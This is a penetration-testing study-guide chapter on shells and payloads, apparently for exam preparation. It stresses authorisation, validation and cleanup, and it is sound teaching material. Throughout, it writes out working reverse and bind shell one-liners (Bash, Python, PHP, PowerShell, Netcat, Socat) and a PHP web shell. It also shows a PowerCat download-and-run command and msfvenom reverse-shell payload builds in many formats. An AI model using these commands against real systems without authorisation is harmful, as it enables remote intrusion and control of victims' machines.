# 03 · Shells and payloads

Turn an authorised execution primitive into a validated, usable session — and match the payload to the
target. The loop: `authorised RCE → choose reverse/bind/Web/direct → prove OS/arch/runtime → draw
initiator→address:port→listener → pick a compatible payload/format/consumer → prepare the exact
listener/handler → deliver/trigger in the owning chapter → validate host/identity/session → stabilize
only if useful → stop/route → clean every local and target artifact.`

**Generation, delivery, trigger, connection, and stabilization are separate transitions** — evidence
or authority for one does not authorise the next. A connection is not proof of a usable shell, and a
shell is not proof of admin/SYSTEM/domain privilege or persistence.

**Routes:** the vuln/upload/injection **trigger** stays in [§02](02-web-attacks.md); password handling
in [§04](04-password-attacks.md); local privilege escalation in [§05](05-linux-privesc.md)/[§06](06-windows-privesc.md);
reachability/pivot in [§07](07-pivoting-and-tunneling.md); domain/lateral execution in [§08](08-active-directory.md);
transfer/staging in [§09](09-file-transfers.md); minimum post-access evidence in [§10](10-post-exploitation-and-loot.md).
**Excluded from §03:** account creation, "a second way back"/persistence, broad credential/file search,
post modules, AV/IDS evasion, and forced-authentication/spoofing chains.

Placeholders: `LHOST`/`LPORT` (a listener you own), `TARGET_HOST`, `TARGET_OS`, `TARGET_ARCH`,
`RUNTIME`, `PAYLOAD_FAMILY`, `FORMAT`, `HANDLER`, `FIFO_PATH`, `SESSION_ID`, `TIME_BUDGET`. Tool
option/flag/format/payload names and framework/exam semantics are **version-volatile** — treat exact
syntax as a `HOLD` and verify against the installed build/upstream and the current official exam guide.

**Jump:** [controller](#31-shell-controller-and-authority) · [listener preflight](#32-listener-and-network-preflight) ·
[reverse/bind/web](#33-reverse-vs-bind-vs-web-vs-direct) · [netcat/FIFO](#34-netcat-listeners-and-fifo-variants) ·
[Unix shells](#35-unix-runtime-reverse-shells) · [Windows shells](#36-windows-raw-shells) ·
[web shell](#37-web-shell-and-conversion) · [transformations](#38-delivery-context-transformations) ·
[payload manifest](#39-payload-manifest-and-stagedness) · [native consumers](#310-native-executable-consumers) ·
[web payloads](#311-web-and-application-payload-consumers) · [shellcode](#312-raw-output-and-shellcode) ·
[MSF handler](#313-metasploit-handler-and-session-lifecycle) · [stabilize](#314-pty-and-terminal-stabilization) ·
[Socat](#315-socat-reverse-bind-and-full-tty) · [Socat TLS](#316-socat-tls-companion) ·
[validation](#317-validation-and-failure-controller) · [credentialed exec](#318-credentialed-and-direct-exec-routes) ·
[post-access](#319-minimal-post-access-handoff) · [cleanup](#320-cleanup-and-closeout).

## 3.1 Shell controller and authority

Before any listener/payload, record: the observed execution primitive and its owning chapter; the
**shell type** (reverse / bind / Web request-response / credentialed direct-exec); target
**OS/arch/runtime/current identity** from evidence (not a file extension or "common" guess); the time
window; and an evidence/cleanup manifest. Any unknown authority, direction, runtime, or a volatile
exam-rule dependency is a **STOP/HOLD**, not a guess.

> **Exam note (dated `HOLD`):** the Metasploit/Meterpreter allowance and one-machine limit are volatile
> — verify against the current official OffSec guide before relying on it; a plain reverse shell caught
> with a raw listener is generally not "Metasploit use", but confirm the current rule.

## 3.2 Listener and network preflight

Draw `initiator → reachable address:port → listener` and prove the path before syntax.

```bash
ip -br address                         # which local interface/address will the target reach?
ss -tlnp | grep LPORT                  # is the port free? (below 1024 needs privilege)
```

State the **bind address** (a VPN/tunnel interface, not `0.0.0.0` by default), port ownership/privilege,
the expected peer (`EXPECTED_PEER`), and NAT/route/firewall assumptions. **Correction:** "443/80/53 are
likely allowed" is folklore — use actual route/firewall/interface evidence. Open one bounded connection
window; on success stop and release the socket ([§3.20](#320-cleanup-and-closeout)).

## 3.3 Reverse vs bind vs Web vs direct

Pick by which side can reach which — one listener is not universal.

| Type | Direction | Use when | Notes |
|---|---|---|---|
| **Reverse** | target → your listener | target has outbound egress; you are firewalled/NAT'd | most common; you own the listener |
| **Bind** | you → target listener | target can expose an inbound port and you can reach it | exposes a service on the target — weigh it |
| **Web** (request/response) | HTTP requests | you already have Web code-exec | may already suffice; a callback adds risk/value |
| **Direct/credentialed** | tool-owned session | you have valid creds for a remote-exec service | [§3.18](#318-credentialed-and-direct-exec-routes); not payload generation |

No reachable direction/consumer → revisit [§01](01-recon-and-enumeration.md)/[§02](02-web-attacks.md)/
[§07](07-pivoting-and-tunneling.md). A request/response Web shell may already satisfy the task — convert
to an interactive shell only when it adds value.

## 3.4 Netcat listeners and FIFO variants

Netcat names/flags/execute-support vary by **build** (`nc`, `netcat`, `ncat` are not one contract, and
`-e` is absent from many builds) — verify locally before relying on syntax.

```bash
nc -nvlp LPORT                         # plain one-shot stream listener
rlwrap nc -nvlp LPORT                  # local line editing/history ONLY — not a remote PTY
```

**Reverse FIFO** (no `-e` needed) — use a unique path and remove it even on failure:
```bash
# on the target (reverse → your LHOST:LPORT):
mkfifo FIFO_PATH; nc LHOST LPORT < FIFO_PATH | /bin/sh > FIFO_PATH 2>&1; rm -f FIFO_PATH
```
**Bind FIFO** — the target listens; confirm inbound exposure/authority, then connect once:
```bash
# on the target:  mkfifo FIFO_PATH; nc -lvnp LPORT < FIFO_PATH | /bin/sh > FIFO_PATH 2>&1; rm -f FIFO_PATH
# from you:       nc TARGET_HOST LPORT
```

**Corrections:** `rlwrap` only improves *local* editing; label the target vs attacker endpoint (the
note's FIFO "listener" wording is ambiguous). Give each FIFO a unique path/owner/mode and clean it on
every exit path. Auto-relisten is bounded, not infinite — cap attempts/time, fix the expected peer, and
stop on first success (a new connection may be unrelated):
```bash
for i in $(seq 1 5); do nc -nvlp LPORT; done   # bounded, not `while true`
```

## 3.5 Unix runtime reverse shells

Each is a distinct runtime card — record the exact interpreter/version/feature and the callback route;
interactive text output is **not** a PTY ([§3.14](#314-pty-and-terminal-stabilization)).

```bash
# Bash /dev/tcp — a Bash FEATURE (not a real device); /bin/sh may not support it:
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
# Python — set the exact major version and shell path:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
# PHP — needs the socket/exec functions enabled in that runtime (delivery → §02):
php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Distinguish failure signals: missing runtime/module, wrong shell path, quoting/encoding, or no callback
are **different** negatives ([§3.17](#317-validation-and-failure-controller)). Delivery through a
command-injection/RCE input point is owned by [§02](02-web-attacks.md); §03 starts at the approved
runtime consumer. Clean child processes, any FIFO, and sensitive history on exit.

## 3.6 Windows raw shells

Record Windows version/arch, PowerShell/.NET version, language mode/execution policy, and the
quoting/encoding consumer. Hidden-window/execution-policy flags are **not** success, stealth, or
authorisation evidence.

```powershell
# PowerShell reverse one-liner (ASCII stream). URL-encode only the exact param when delivering via web:
powershell -NoP -W Hidden -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

Helper-binary consumers need provenance/build/arch and a transfer route ([§09](09-file-transfers.md)):
```powershell
# PowerCat — reviewed script provenance; download mechanics → §09 (no "fileless = safe/stealth" claim):
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/powercat.ps1');powercat -c LHOST -p LPORT -e cmd"
# nc.exe — trusted build/arch; `-e` is build-specific; staging/cache cleanup → §09:
C:\Windows\Temp\nc.exe -e cmd.exe LHOST LPORT
```

**Corrections:** the ASCII-only stream can corrupt non-ASCII data and is not a full terminal; PowerCat
"fileless" does not remove logging/artifacts; a staged `nc.exe` build may lack `-e`. Remove any
downloaded script/binary/temp and protect history/logs on exit.

## 3.7 Web shell and conversion

**Context:** you already have authorised Web code execution (upload/injection **trigger** is
[§02](02-web-attacks.md)). Decide whether request/response access is already sufficient **before**
adding a callback.

```php
<?php system($_GET['c']); ?>            <!-- minimal request/response; runtime/identity proof first -->
```

Convert to an interactive reverse shell only when it adds value (e.g. you need a stable session), mapping
the callback to the **same host/identity** you already proved. A conversion that adds exposure without
value is skipped. Cleanup is owned with the Web artifact ([§02](02-web-attacks.md)) plus your
listener/child shell.

## 3.8 Delivery-context transformations

Encode the **exact syntactic component** the consumer requires — this is a byte/quoting representation,
**not** a filter/AV bypass, encryption, or safety guarantee.

```bash
# base64 a command and decode on target (round-trip the bytes; confirm the decoder exists):
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64
# on target:  echo '<b64>' | base64 -d | bash
```

URL-encoding a whole command is not automatically safe for a specific query/body/parser component —
encode only what that parser needs. If a defensive control blocks execution, that is a **stop/route**
([§3.17](#317-validation-and-failure-controller)), not a reason to keep re-encoding. Delete encoded/
decoded temp and request captures.

## 3.9 Payload manifest and stagedness

Before generating, fix: `PAYLOAD_FAMILY` (shell vs Meterpreter/framework), OS/arch/runtime,
staged vs stageless, reverse/bind direction, transport, `FORMAT`, the exact **consumer**, and the
matching **handler**. A format/extension is not a consumer, and a raw listener is not a universal handler.

```text
msfvenom naming (verify names against the installed build):
  staged    = OS/arch/payload/stage   e.g. windows/x64/meterpreter/reverse_tcp   (needs a stage + MSF handler)
  stageless = OS/arch/payload_stage    e.g. windows/x64/shell_reverse_tcp         (self-contained; raw listener ok)
  Windows 32-bit omits the arch:       windows/shell_reverse_tcp
```

**Corrections:** staged (smaller first stage, needs stage delivery + exact framework handler) and
stageless (larger, self-contained) differ in size/network/failure behaviour and consumer — do not treat
a plain-stream listener, a staged shell, and a Meterpreter session as interchangeable. Names/availability
are an installed-version `HOLD` (`msfvenom --list payloads`). **Excluded:** operational encoder/AV-evasion
framing (e.g. repeated `shikata_ga_nai` "for evasion") — a control block is a stop, not a re-encode cue.

## 3.10 Native executable consumers

Each format has an exact loader/consumer; a format is a **consumer hypothesis**, not exploit proof.
Generation does not authorise transfer/execution ([§09](09-file-transfers.md)); mutation/trigger routes
to [§05](05-linux-privesc.md)/[§06](06-windows-privesc.md).

```bash
# Windows PE / service / DLL / MSI (x64 shown; match arch + consumer):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o ARTIFACT.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f exe-service -o ARTIFACT.exe   # SCM consumer → §6.5–6.7
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o ARTIFACT.dll   # host process/bitness/load path → §6.12
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o ARTIFACT.msi   # Windows Installer policy → §6.8
# Linux ELF executable vs shared object:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf    -o ARTIFACT       # OS loader
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf-so -o ARTIFACT.so    # shared object, needs a loading consumer
```

**Corrections:** `exe-service` is the **intended** SCM consumer, not a guarantee it "survives" launch —
its start/exit behaviour is version-specific; `-f elf-so` is an ELF **shared object** (the note's "shell
script" label is wrong) needing an explicit loader; a DLL/MSI format alone does not prove hijack/installer
elevation — those triggers are [§06](06-windows-privesc.md) with their own mutation authority and rollback.
**Excluded:** `windows/adduser` and `windows/exec CMD='net user … /add'` account-creation payloads. Clean
generated/uploaded artifacts, processes, and transfer servers on exit.

## 3.11 Web and application payload consumers

PHP, Classic ASP, ASP.NET, JSP and WAR are **different** runtimes/deployers — do not collapse them.
Delivery/deployment is [§02](02-web-attacks.md); §03 owns the consumer/format contract.

```bash
msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw -o ARTIFACT.php    # ensure <?php tags for the runtime
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f aspx -o ARTIFACT.aspx  # ASP.NET (app-pool bitness/runtime)
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f asp -o ARTIFACT.asp         # Classic ASP — different consumer
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o ARTIFACT.war         # servlet-container deployer
```

**Corrections:** Classic ASP and ASP.NET are distinct consumers; match app-pool bitness/runtime and the
exact handler. A JSP source file (consumed by the JSP engine) and a WAR (deployed by a servlet container)
are different delivery topologies — merge duplicate JSP/WAR cues but keep the consumers separate. Verify
PHP syntax/runtime/config rather than blindly concatenating tags. Remove Web artifacts, app temp/cache,
and restore any changed path/ACL.

## 3.12 Raw output and shellcode

Raw generator output is **injection-consumer input**, not a standalone file; shellcode is
**exploit-consumer** input, not an independent payload.

```bash
# raw command for an exact injection consumer (quoting/encoding from that context):
msfvenom -p cmd/unix/reverse_bash LHOST=LHOST LPORT=LPORT -f raw
# shellcode for a BOF/exploit consumer — bad chars/length come from the exploit, not a copied constant:
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -b '\x00\x0a\x0d' -f python -v shellcode
```

Shellcode is embedded by an exploit's source/loader with consumer-derived architecture, space, and
bad-character constraints — route BOF/exploit construction to an exploit-development companion (the vuln
trigger is [§02](02-web-attacks.md)). Do not copy example bad-char sets or lengths; derive them from the
exact target. Protect/delete generated buffers, crash dumps, and debug artifacts.

## 3.13 Metasploit handler and session lifecycle

The `multi/handler` payload must match the generated artifact **exactly** (family/stagedness/transport/
address/port). A plain-stream listener, a staged shell, a stageless shell, and Meterpreter are **not**
interchangeable.

```text
use exploit/multi/handler
set payload <exact-matching-payload>     # same as the msfvenom -p value
set LHOST LHOST ; set LPORT LPORT
exploit -j                               # background job; accept ONE expected session
sessions -i SESSION_ID                   # interact; sessions -l to list
```

Record the session's exact host/identity/type and its job/handler dependency; backgrounding changes
console state, not authority. Close per-session/job and verify — **`sessions -K` (kill-all) is not a
default** (it can drop unrelated sessions). Payload/handler/job syntax and the exam allowance are
`HOLD` (verify against the installed build and current official guide). Stop on handler error, stage
mismatch, unknown peer, multiple unexpected sessions, or `TIME_BUDGET` expiry.

## 3.14 PTY and terminal stabilization

Target PTY allocation, the local controlling terminal, and terminal capabilities are **separate**
stages — stabilize only to the minimum the task needs (full TTY is not always required), and always keep
a local recovery path.

```bash
# 1. target PTY (use the exact available python):
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2. background (Ctrl-Z), fix the LOCAL terminal, foreground:
stty raw -echo; fg
# 3. set a supported terminal type + size:
export TERM=xterm; stty rows <R> cols <C>
# recovery after a lost/broken shell:
reset    # or: stty sane
```

**Corrections:** a target PTY alone does not fix local job control; `TERM=xterm` alone is not a full TTY;
these sequences may not work in a browser/managed console. Record the local terminal before-state and
restore sane/echo on any failure or exit. Validate with Ctrl-C affecting the remote command and, only if
needed, tab-complete/editor — do not require an editor for a one-command proof.

## 3.15 Socat reverse, bind, and full-TTY

Socat syntax/behaviour is build- and OS-specific (Windows `pipes`/`EXEC` semantics differ) — a plain
Socat stream is **not** automatically a PTY. Socat is often not installed; a transferred binary needs
trust/hash/arch/libc checks and cleanup ([§09](09-file-transfers.md)).

```bash
# Basic reverse (target → your listener):
# you:      socat TCP-L:LPORT -
# target:   socat TCP:LHOST:LPORT EXEC:'bash -li'          # Windows: EXEC:powershell.exe,pipes
# Basic bind (target listens; confirm inbound authority):
# target:   socat TCP-L:LPORT EXEC:'bash -li'
# you:      socat TCP:TARGET_HOST:LPORT -
```

**Full-TTY matched pair** (both ends are one design; target needs the Socat binary):
```bash
# you:      socat FILE:`tty`,raw,echo=0 TCP-L:LPORT
# target:   socat TCP:LHOST:LPORT EXEC:'bash -li',pty,stderr,sigint,setsid,sane
```

`pty` allocates the pseudoterminal, `stderr` surfaces errors, `sigint` passes Ctrl-C, `setsid` makes a
new session, `sane` normalises the terminal. **Corrections:** an arbitrary payload does not fit the
special full-TTY listener (they are a matched pair); backtick/quoting behaviour depends on the invoking
shell; verify option names against the installed version. Close both Socat processes, release the port,
and remove any transferred binary on exit.

## 3.16 Socat TLS companion

TLS encrypts the transport; it does **not** authenticate the peer when verification is off, and it is
**not** an IDS/EDR/firewall bypass. The listening side holds the key/cert (a sensitive artifact).

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem
# reverse (you listen, holding the cert):
# you:      socat OPENSSL-LISTEN:LPORT,cert=shell.pem,verify=0 -
# target:   socat OPENSSL:LHOST:LPORT,verify=0 EXEC:'bash -li'
```

**Corrections:** `verify=0` is a visible loss of certificate authenticity — never describe it as secure;
a short-lived lab cert is fine (no year-long default, no random identity data required). A TLS **bind**
shell places a private key on the target and opens an exposed listener — prefer a lower-artifact branch
or treat it as a bounded companion. Delete the key/cert/`.pem` and history when done; "encrypted" is not
"stealthy" or authorised.

## 3.17 Validation and failure controller

A timeout/no-callback is **UNKNOWN**, not proof the payload syntax failed. Reconcile evidence and change
**one** variable at a time (after cleanup) — never stack blind variants.

```text
Failure taxonomy → check in order:
  listener not bound / wrong interface   → §3.2   port conflict / privilege
  route / firewall / NAT / wrong direction → §3.2/§3.3
  missing runtime/binary / wrong shell path → §3.5/§3.6
  quoting / encoding / truncation         → §3.8
  format ↔ consumer mismatch              → §3.10/§3.11
  stage ↔ handler mismatch                → §3.9/§3.13
  peer connected but no usable shell      → §3.14 (stabilize) — connection ≠ usable shell
```

Success is **one** expected connection/session mapped to the exact host/identity/session-type, plus a
bounded command round-trip. Stop on first sufficient proof, an unexpected identity/host/peer, a
crash/reconnect loop, or `TIME_BUDGET` expiry. Terminate old processes/listeners and remove stale
FIFO/files before any retry.

## 3.18 Credentialed and direct-exec routes

When you already hold valid credentials, a tool-owned session skips dropping a payload. WinRM, WMI, and
service-control are **different** consumers with different auth/artifacts and require fresh
credential-use/remote-execution authority — **authentication success is not privilege.**

```bash
evil-winrm -i TARGET_HOST -u <user> -p <pass>          # WinRM 5985/5986
impacket-wmiexec  DOMAIN/user:pass@TARGET_HOST          # semi-interactive; no new service
impacket-psexec   DOMAIN/user:pass@TARGET_HOST          # SYSTEM, but creates a service (noisy)
```

Route domain/local remote execution to [§08](08-active-directory.md)/[§10](10-post-exploitation-and-loot.md),
reachability to [§07](07-pivoting-and-tunneling.md), and credential handling/staging to
[§04](04-password-attacks.md)/[§09](09-file-transfers.md). §03 keeps only the session-type controller and
backlink; clean any created service/file/process and close the session.

## 3.19 Minimal post-access handoff

Prove the least that the next step needs, then route out.

```bash
id                # Linux
whoami /all & hostname & systeminfo | findstr /B /C:"OS"    # Windows
```

Capture current identity/host/OS/arch as **evidence** — a connection is not admin/SYSTEM/domain privilege
or persistence. Route minimum post-access inventory/credential discovery to [§10](10-post-exploitation-and-loot.md),
local escalation to [§05](05-linux-privesc.md)/[§06](06-windows-privesc.md), and domain/lateral work to
[§08](08-active-directory.md). **Excluded:** account creation, "a second way back"/persistence, and broad
credential/file collection are not §03 steps.

## 3.20 Cleanup and closeout

End every branch — success, negative, or aborted — by restoring state:

```text
- processes/sessions: target child shells, local listeners/handlers/jobs (exact IDs, not blind kill-all)
- sockets/ports: released and verified (ss -tlnp)
- files: FIFO_PATH, uploaded/generated artifacts, downloaded scripts/binaries, transfer servers/caches
- Web/app: remove Web shell/artifact, restore changed path/ACL (with §02)
- Windows: restore any service/app/install before-state you touched (mutation itself → §06)
- crypto: delete private key/cert/.pem
- terminal: restore local sane/echo; protect/remove history/transcripts (no secret values retained)
```

Leave nothing behind: no persistent listeners, accounts, backdoors, planted binaries, or unrestored
service/app state. Retain only non-secret evidence (identity/host/session facts) and hand off to the
owning chapter with fresh scope.

## References

- Payload/format/handler/session names and the exam's Metasploit/Meterpreter allowance drift — verify
  against the installed build (`msfvenom --list payloads`, `--list formats`) and the current official
  guide; mark unverified forms `HOLD`. External shell generators (e.g. revshells.com) are a convenience,
  not source of truth — understand each line and check provenance/consumer.
- Chapter handoffs are linked inline: recon [§01](01-recon-and-enumeration.md), web
  [§02](02-web-attacks.md), passwords [§04](04-password-attacks.md), Linux [§05](05-linux-privesc.md),
  Windows [§06](06-windows-privesc.md), pivoting [§07](07-pivoting-and-tunneling.md), Active Directory
  [§08](08-active-directory.md), transfers [§09](09-file-transfers.md), loot
  [§10](10-post-exploitation-and-loot.md).
